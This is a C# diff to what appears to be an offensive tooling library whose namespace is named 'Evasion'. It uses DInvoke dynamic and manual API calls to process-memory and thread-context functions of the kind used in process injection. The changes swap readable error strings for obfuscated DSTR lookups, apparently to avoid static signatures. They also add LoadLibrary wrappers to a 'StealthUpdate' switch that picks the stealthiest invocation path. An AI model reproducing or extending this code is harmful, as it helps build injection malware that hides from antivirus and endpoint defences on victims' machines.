@@ -5,6 +5,7 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
 using static System.Evasion.ModuleMapper.ModuleConst;
+using static System.EnvironmentEx;
 
 namespace System
 {
@@ -556,52 +557,52 @@ namespace System
             if (retValue == NTSTATUS.AccessDenied)
             {
                 // STATUS_ACCESS_DENIED
-                throw new UnauthorizedAccessException("Access is denied.");
+                throw new UnauthorizedAccessException(DSTR(DSTR_ACCESS_DENIED));
             }
             if (retValue == NTSTATUS.AlreadyCommitted)
             {
                 // STATUS_ALREADY_COMMITTED
-                throw new InvalidOperationException("The specified address range is already committed.");
+                throw new Exception(DSTR(DSTR_ALREADY_COMMITTED));
             }
             if (retValue == NTSTATUS.CommitmentLimit)
             {
                 // STATUS_COMMITMENT_LIMIT
-                throw new InvalidOperationException("Your system is low on virtual memory.");
+                throw new Exception(DSTR(DSTR_LOW_ON_VMEM));
             }
             if (retValue == NTSTATUS.ConflictingAddresses)
             {
                 // STATUS_CONFLICTING_ADDRESSES
-                throw new InvalidOperationException("The specified address range conflicts with the address space.");
+                throw new Exception(DSTR(DSTR_CONFLICTING_ADDRESS));
             }
             if (retValue == NTSTATUS.InsufficientResources)
             {
                 // STATUS_INSUFFICIENT_RESOURCES
-                throw new InvalidOperationException("Insufficient system resources exist to complete the API call.");
+                throw new Exception(DSTR(DSTR_INSUFFICIENT_RESOURCES));
             }
             if (retValue == NTSTATUS.InvalidHandle)
             {
                 // STATUS_INVALID_HANDLE
-                throw new InvalidOperationException("An invalid HANDLE was specified.");
+                throw new Exception(DSTR(DSTR_INVALID_HANDLE));
             }
             if (retValue == NTSTATUS.InvalidPageProtection)
             {
                 // STATUS_INVALID_PAGE_PROTECTION
-                throw new InvalidOperationException("The specified page protection was not valid.");
+                throw new Exception(DSTR(DSTR_INVALID_PAGE_PROTECT));
             }
             if (retValue == NTSTATUS.NoMemory)
             {
                 // STATUS_NO_MEMORY
-                throw new InvalidOperationException("Not enough virtual memory or paging file quota is available to complete the specified operation.");
+                throw new Exception(DSTR(DSTR_INSUFFICIENT_RESOURCES));
             }
             if (retValue == NTSTATUS.ObjectTypeMismatch)
             {
                 // STATUS_OBJECT_TYPE_MISMATCH
-                throw new InvalidOperationException("There is a mismatch between the type of object that is required by the requested operation and the type of object that is specified in the request.");
+                throw new Exception(DSTR(DSTR_OBJECT_TYPE_MISMATCH));
             }
             if (retValue != NTSTATUS.Success)
             {
                 // STATUS_PROCESS_IS_TERMINATING == 0xC000010A
-                throw new InvalidOperationException("An attempt was made to duplicate an object handle into or out of an exiting process.");
+                throw new Exception(DSTR(DSTR_PROC_EXITING));
             }
 
             BaseAddress = (IntPtr)funcargs[1];
@@ -650,7 +651,7 @@ namespace System
             NTSTATUS retValue = (NTSTATUS)Evasion.DInvoke.DynamicAPIInvoke(@"ntdll.dll", @"NtWriteVirtualMemory", typeof(DELEGATES.NtWriteVirtualMemory), ref funcargs);
             if (retValue != NTSTATUS.Success)
             {
-                throw new InvalidOperationException("Failed to write memory, " + retValue);
+                throw new Exception(DSTR(DSTR_FAILED_MEMORY_WRITE));
             }
 
             BytesWritten = (UInt32)funcargs[4];
@@ -668,7 +669,7 @@ namespace System
             NTSTATUS retValue = (NTSTATUS)Evasion.DInvoke.DynamicAPIInvoke(@"ntdll.dll", @"RtlGetVersion", typeof(DELEGATES.RtlGetVersion), ref funcargs);
             if (retValue != NTSTATUS.Success)
             {
-                throw new InvalidOperationException("Failed get procedure address, " + retValue);
+                throw new Exception(DSTR(DSTR_PROC_ADDRESS_LOOKUP_FAILED, retValue));
             }
 
             VersionInformation = (OSVERSIONINFOEX)funcargs[0];
@@ -679,7 +680,7 @@ namespace System
             NTSTATUS retValue = NtQueryInformationProcessD(hProcess, PROCESSINFOCLASS.ProcessBasicInformation, out IntPtr pProcInfo);
             if (retValue != NTSTATUS.Success)
             {
-                throw new UnauthorizedAccessException("Access is denied.");
+                throw new Exception(DSTR(DSTR_ACCESS_DENIED));
             }
 
             return (PROCESS_BASIC_INFORMATION)Marshal.PtrToStructure(pProcInfo, typeof(PROCESS_BASIC_INFORMATION));
@@ -705,7 +706,7 @@ namespace System
                     processInformationLength = Marshal.SizeOf(PBI);
                     break;
                 default:
-                    throw new InvalidOperationException($"Invalid ProcessInfoClass: {processInfoClass}");
+                    throw new Exception(DSTR(DSTR_INVALID_PROCINFOCLASS, processInfoClass));
             }
 
             object[] funcargs =
@@ -716,7 +717,7 @@ namespace System
             NTSTATUS retValue = (NTSTATUS)Evasion.DInvoke.DynamicAPIInvoke(@"ntdll.dll", @"NtQueryInformationProcess", typeof(DELEGATES.NtQueryInformationProcess), ref funcargs);
             if (retValue != NTSTATUS.Success)
             {
-                throw new UnauthorizedAccessException("Access is denied.");
+                throw new UnauthorizedAccessException(DSTR(DSTR_ACCESS_DENIED));
             }
 
             // Update the modified variables
@@ -747,7 +748,7 @@ namespace System
             NTSTATUS retValue = (NTSTATUS)Evasion.DInvoke.DynamicAPIInvoke(@"ntdll.dll", @"LdrGetProcedureAddress", typeof(DELEGATES.LdrGetProcedureAddress), ref funcargs);
             if (retValue != NTSTATUS.Success)
             {
-                throw new InvalidOperationException("Failed get procedure address, " + retValue);
+                throw new Exception(DSTR(DSTR_PROC_ADDRESS_LOOKUP_FAILED, retValue));
             }
 
             FunctionAddress = (IntPtr)funcargs[3];
@@ -766,7 +767,7 @@ namespace System
             NTSTATUS retValue = (NTSTATUS)Evasion.DInvoke.DynamicAPIInvoke(@"ntdll.dll", @"NtProtectVirtualMemory", typeof(DELEGATES.NtProtectVirtualMemory), ref funcargs);
             if (retValue != NTSTATUS.Success)
             {
-                throw new InvalidOperationException("Failed to change memory protection, " + retValue);
+                throw new Exception(DSTR(DSTR_FAILED_MEMPROTECT, retValue));
             }
 
             OldProtect = (UInt32)funcargs[4];
@@ -842,7 +843,7 @@ namespace System
             }
             else
             {
-                throw new IndexOutOfRangeException("Destination buffer size is too small");
+                throw new Exception(DSTR(DSTR_BUFFER_TOO_SMALL));
             }
             return retValue;
         }
@@ -865,7 +866,7 @@ namespace System
             }
             else
             {
-                throw new IndexOutOfRangeException("Destination buffer size is too small");
+                throw new Exception(DSTR(DSTR_BUFFER_TOO_SMALL));
             }
             return retValue;
         }
@@ -935,6 +936,39 @@ namespace System
             bool result = (bool)Evasion.DInvoke.ManualInvoke(CONST_KERNEL32, "VirtualProtectEx", typeof(_VirtualProtectEx), ref funcArgs);
             oldProtectionType = (int)funcArgs[funcArgs.Length - 1];
             return result;
+        }
+        #endregion
+
+        #region LoadLibrary
+        #if USE_PINVOKE
+        [DllImport("kernel32", SetLastError=true, CharSet = CharSet.Ansi)]
+        private static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);
+
+        public static IntPtr LoadLibraryP(string lpFileName)
+        {
+            return LoadLibrary(lpFileName);
+        }
+        #else
+        public static IntPtr LoadLibraryD(string lpFileName)
+        {
+            // Craft an array for the arguments
+            object[] funcargs =
+            {
+                lpFileName
+            };
+            return (IntPtr)Evasion.DInvoke.DynamicAPIInvoke(CONST_KERNEL32, @"LoadLibrary", typeof(_LoadLibrary), ref funcargs);
+        }
+        #endif
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate IntPtr _LoadLibrary(string lpFileName);
+        public static IntPtr LoadLibraryM(string lpFileName)
+        {
+            // Craft an array for the arguments
+            object[] funcargs =
+            {
+                lpFileName
+            };
+            return (IntPtr)Evasion.DInvoke.ManualInvoke(CONST_KERNEL32, @"LoadLibrary", typeof(_LoadLibrary), ref funcargs); ;
         }
         #endregion
 
@@ -1091,7 +1125,7 @@ namespace System
 #endregion
 #endregion
 
-#region DInvoke Internal Registry
+        #region DInvoke Internal Registry
         private struct DELEGATES
         {
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
@@ -1171,6 +1205,7 @@ namespace System
         public static Native._GetThreadContext GetThreadContext { get; private set; }
         public static Native._SetThreadContext SetThreadContext { get; private set; }
         public static Native._ResumeThread ResumeThread { get; private set; }
+        public static Native._LoadLibrary LoadLibrary { get; private set; }
         
         private static void StealthUpdate()
         {
@@ -1185,6 +1220,7 @@ namespace System
                 GetThreadContext = Native.GetThreadContextM;
                 SetThreadContext = Native.SetThreadContextM;
                 ResumeThread = Native.ResumeThreadM;
+                LoadLibrary = Native.LoadLibraryM;
             }
             else
             {
@@ -1198,6 +1234,7 @@ namespace System
                 GetThreadContext = Native.GetThreadContextP;
                 SetThreadContext = Native.SetThreadContextP;
                 ResumeThread = Native.ResumeThreadP;
+                LoadLibrary = Native.LoadLibraryP;
 #else
                 WriteProcessMemory = Native.WriteProcessMemoryD;
                 ReadProcessMemory = Native.ReadProcessMemoryD;
@@ -1208,6 +1245,7 @@ namespace System
                 GetThreadContext = Native.GetThreadContextD;
                 SetThreadContext = Native.SetThreadContextD;
                 ResumeThread = Native.ResumeThreadD;
+                LoadLibrary = Native.LoadLibraryD;
 #endif
             }
         }
